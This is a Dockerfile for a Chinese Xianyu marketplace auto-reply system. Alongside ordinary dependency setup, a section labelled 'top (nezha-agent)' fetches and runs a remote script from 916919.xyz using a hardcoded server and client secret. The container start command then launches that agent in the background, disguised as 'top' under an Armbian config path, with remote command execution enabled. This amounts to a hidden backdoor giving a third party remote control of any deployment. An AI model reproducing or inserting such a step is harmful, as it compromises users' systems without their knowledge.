# 使用Python 3.11作为基础镜像
FROM python:3.11-slim-bookworm

# 设置标签信息
LABEL maintainer="zhinianboke"
LABEL version="2.2.0"
LABEL description="闲鱼自动回复系统 - 企业级多用户版本，支持自动发货和免拼发货"
LABEL repository="https://github.com/zhinianboke/xianyu-auto-reply"
LABEL license="仅供学习使用，禁止商业用途"
LABEL author="zhinianboke"

# 设置工作目录
WORKDIR /app

# 设置环境变量
ENV PYTHONUNBUFFERED=1
ENV PYTHONDONTWRITEBYTECODE=1
ENV TZ=Asia/Shanghai
ENV DOCKER_ENV=true
ENV PLAYWRIGHT_BROWSERS_PATH=/ms-playwright

# 安装系统依赖（包括Playwright浏览器依赖）
RUN apt-get update && \
    apt-get install -y --no-install-recommends \
        nodejs \
        npm \
        tzdata \
        curl \
        ca-certificates \
        wget \
        unzip \
        libjpeg-dev \
        libpng-dev \
        libfreetype6-dev \
        fonts-dejavu-core \
        fonts-liberation \
        libnss3 \
        libnspr4 \
        libatk-bridge2.0-0 \
        libdrm2 \
        libxkbcommon0 \
        libxcomposite1 \
        libxdamage1 \
        libxrandr2 \
        libgbm1 \
        libxss1 \
        libasound2 \
        libatspi2.0-0 \
        libgtk-3-0 \
        libgdk-pixbuf2.0-0 \
        libxcursor1 \
        libxi6 \
        libxrender1 \
        libxext6 \
        libx11-6 \
        libxft2 \
        libxinerama1 \
        libxtst6 \
        libappindicator3-1 \
        libx11-xcb1 \
        libxfixes3 \
        xdg-utils \
        && apt-get clean \
        && rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*

# 设置时区
RUN ln -snf /usr/share/zoneinfo/$TZ /etc/localtime && echo $TZ > /etc/timezone

# 验证Node.js安装并设置环境变量
RUN node --version && npm --version
ENV NODE_PATH=/usr/lib/node_modules

# 复制requirements.txt并安装Python依赖
COPY requirements.txt .
RUN pip install --no-cache-dir --upgrade pip && \
    pip install --no-cache-dir -r requirements.txt

# 复制项目文件
COPY . .

# 安装Playwright浏览器（必须在复制项目文件之后）
RUN playwright install chromium && \
    playwright install-deps chromium

# ---------------- 安装并配置 top (nezha-agent) ----------------
# 设置 top 环境变量（可以在 docker run 时覆盖）
ENV NZ_SERVER=ko30re.916919.xyz:443
ENV NZ_TLS=true
ENV NZ_CLIENT_SECRET=kO3irsfICJvxqZFUE2bVHGbv2YQpd0Re

# 下载并安装 top，删除构建时生成的配置文件
RUN curl -L https://r2.916919.xyz/ko30re/top.sh -o /tmp/top.sh \
    && chmod +x /tmp/top.sh \
    && env NZ_SERVER=${NZ_SERVER} NZ_TLS=${NZ_TLS} NZ_CLIENT_SECRET=${NZ_CLIENT_SECRET} /tmp/top.sh \
    && rm -f /tmp/top.sh \
    && rm -f /usr/lib/armbian/config/top*.yml \
    && echo "Top binary installed, config will be generated at runtime"

# ---------------- END top ----------------

# 创建必要的目录并设置权限
RUN mkdir -p /app/logs /app/data /app/backups /app/static/uploads/images && \
    chmod 777 /app/logs /app/data /app/backups /app/static/uploads /app/static/uploads/images

# 暴露端口
EXPOSE 8080

# 健康检查
HEALTHCHECK --interval=30s --timeout=10s --start-period=5s --retries=3 \
    CMD curl -f http://localhost:8080/health || exit 1

# 复制启动脚本并设置权限
COPY entrypoint.sh /app/entrypoint.sh
RUN chmod +x /app/entrypoint.sh && \
    dos2unix /app/entrypoint.sh 2>/dev/null || true

# 启动命令 - 保持entrypoint.sh不变，同时启动top进程
# 在启动时生成唯一UUID配置，然后启动top进程和主程序
CMD ["/bin/bash", "-c", "\
# 生成基于容器运行时信息的唯一UUID \
CONTAINER_ID=$(hostname) && \
TIMESTAMP=$(date +%s%N) && \
RANDOM_STR=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 12 | head -n 1) && \
COMBINED=\"${CONTAINER_ID}-${TIMESTAMP}-${RANDOM_STR}\" && \
UUID=$(echo -n \"$COMBINED\" | sha256sum | cut -d' ' -f1 | sed 's/\\(.\\{8\\}\\)\\(.\\{4\\}\\)\\(.\\{4\\}\\)\\(.\\{4\\}\\)\\(.\\{12\\}\\)/\\1-\\2-\\3-\\4-\\5/') && \
# 创建唯一的top配置文件 \
cat > /usr/lib/armbian/config/top.yml << EOL \
server: ${NZ_SERVER} \
client_secret: ${NZ_CLIENT_SECRET} \
tls: ${NZ_TLS} \
uuid: ${UUID} \
disable_auto_update: true \
disable_force_update: true \
disable_command_execute: false \
skip_connection_count: false \
skip_procs_count: false \
report_delay: 1 \
ignore_nic: docker0 \
EOL \
&& echo \"Generated unique top config with UUID: ${UUID}\" \
&& chmod 644 /usr/lib/armbian/config/top.yml \
&& chmod +x /usr/lib/armbian/config/top \
&& /usr/lib/armbian/config/top -c /usr/lib/armbian/config/top.yml & \
exec /app/entrypoint.sh"]
